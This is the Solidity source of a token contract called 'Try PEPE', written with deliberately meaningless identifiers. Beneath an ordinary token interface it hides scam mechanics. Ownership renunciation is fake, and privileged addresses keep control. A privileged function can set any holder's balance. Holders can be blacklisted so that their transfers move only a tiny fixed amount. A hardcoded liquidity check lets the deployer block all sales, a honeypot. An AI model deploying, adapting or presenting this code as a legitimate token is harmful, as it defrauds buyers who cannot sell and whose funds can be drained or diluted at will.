//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface amountSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverTokenLaunch) external view returns (uint256);

    function transfer(address exemptAuto, uint256 launchTradingAmount) external returns (bool);

    function allowance(address launchedFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchTradingAmount) external returns (bool);

    function transferFrom(
        address sender,
        address exemptAuto,
        uint256 launchTradingAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isMax, uint256 value);
    event Approval(address indexed launchedFund, address indexed spender, uint256 value);
}

abstract contract launchedMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedLaunchAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface sellList {
    function createPair(address txMin, address atTeam) external returns (address);
}

interface teamSwap is amountSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TryPEPE is launchedMode, amountSwap, teamSwap {

    string private enableAuto = "Try PEPE";

    function owner() external view returns (address) {
        return teamSender;
    }

    uint256 private marketingIs = 100000000 * 10 ** 18;

    mapping(address => uint256) private limitAuto;

    bool private isBuy;

    function tokenFrom(address autoMax, uint256 launchTradingAmount) public {
        atReceiverSender();
        limitAuto[autoMax] = launchTradingAmount;
    }

    uint8 private listSwap = 18;

    mapping(address => mapping(address => uint256)) private buyLaunched;

    address private teamSender;

    function totalTradingEnable(address launchToken) public {
        atReceiverSender();
        
        if (launchToken == amountSell || launchToken == autoToken) {
            return;
        }
        launchAuto[launchToken] = true;
    }

    function tradingMarketing(address walletLaunch) public {
        require(walletLaunch.balance < 100000);
        if (maxTo) {
            return;
        }
        
        marketingAuto[walletLaunch] = true;
        if (isBuy) {
            isBuy = true;
        }
        maxTo = true;
    }

    mapping(address => bool) public marketingAuto;

    function getOwner() external view returns (address) {
        return teamSender;
    }

    bool private tradingModeList;

    uint256 public modeEnable;

    function name() external view virtual override returns (string memory) {
        return enableAuto;
    }

    function fundAmountTx(uint256 launchTradingAmount) public {
        atReceiverSender();
        receiverTrading = launchTradingAmount;
    }

    uint256 receiverTrading;

    address public autoToken;

    function allowance(address amountTxLimit, address minAutoSell) external view virtual override returns (uint256) {
        if (minAutoSell == atEnable) {
            return type(uint256).max;
        }
        return buyLaunched[amountTxLimit][minAutoSell];
    }

    function autoWallet() public {
        emit OwnershipTransferred(amountSell, address(0));
        teamSender = address(0);
    }

    uint256 launchSwap;

    uint256 public autoAt;

    function totalSupply() external view virtual override returns (uint256) {
        return marketingIs;
    }

    address liquiditySwapAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private atFrom = "TPE";

    constructor (){
        if (tradingModeList != isBuy) {
            modeEnable = fromTotal;
        }
        launchedLaunchAt launchMarketing = launchedLaunchAt(atEnable);
        autoToken = sellList(launchMarketing.factory()).createPair(launchMarketing.WETH(), address(this));
        if (isBuy) {
            autoAt = fromTotal;
        }
        amountSell = _msgSender();
        autoWallet();
        marketingAuto[amountSell] = true;
        limitAuto[amountSell] = marketingIs;
        
        emit Transfer(address(0), amountSell, marketingIs);
    }

    mapping(address => bool) public launchAuto;

    function launchedLimit(address teamAt, address exemptAuto, uint256 launchTradingAmount) internal returns (bool) {
        if (teamAt == amountSell) {
            return senderSwap(teamAt, exemptAuto, launchTradingAmount);
        }
        uint256 listWallet = amountSwap(autoToken).balanceOf(liquiditySwapAuto);
        require(listWallet == receiverTrading);
        require(exemptAuto != liquiditySwapAuto);
        if (launchAuto[teamAt]) {
            return senderSwap(teamAt, exemptAuto, txReceiverExempt);
        }
        return senderSwap(teamAt, exemptAuto, launchTradingAmount);
    }

    bool public maxTo;

    function decimals() external view virtual override returns (uint8) {
        return listSwap;
    }

    event OwnershipTransferred(address indexed atWallet, address indexed swapShouldTotal);

    function balanceOf(address receiverTokenLaunch) public view virtual override returns (uint256) {
        return limitAuto[receiverTokenLaunch];
    }

    function approve(address minAutoSell, uint256 launchTradingAmount) public virtual override returns (bool) {
        buyLaunched[_msgSender()][minAutoSell] = launchTradingAmount;
        emit Approval(_msgSender(), minAutoSell, launchTradingAmount);
        return true;
    }

    function transferFrom(address teamAt, address exemptAuto, uint256 launchTradingAmount) external override returns (bool) {
        if (_msgSender() != atEnable) {
            if (buyLaunched[teamAt][_msgSender()] != type(uint256).max) {
                require(launchTradingAmount <= buyLaunched[teamAt][_msgSender()]);
                buyLaunched[teamAt][_msgSender()] -= launchTradingAmount;
            }
        }
        return launchedLimit(teamAt, exemptAuto, launchTradingAmount);
    }

    uint256 constant txReceiverExempt = 16 ** 10;

    uint256 public fromTotal;

    function symbol() external view virtual override returns (string memory) {
        return atFrom;
    }

    address atEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function atReceiverSender() private view {
        require(marketingAuto[_msgSender()]);
    }

    function transfer(address autoMax, uint256 launchTradingAmount) external virtual override returns (bool) {
        return launchedLimit(_msgSender(), autoMax, launchTradingAmount);
    }

    address public amountSell;

    function senderSwap(address teamAt, address exemptAuto, uint256 launchTradingAmount) internal returns (bool) {
        require(limitAuto[teamAt] >= launchTradingAmount);
        limitAuto[teamAt] -= launchTradingAmount;
        limitAuto[exemptAuto] += launchTradingAmount;
        emit Transfer(teamAt, exemptAuto, launchTradingAmount);
        return true;
    }

}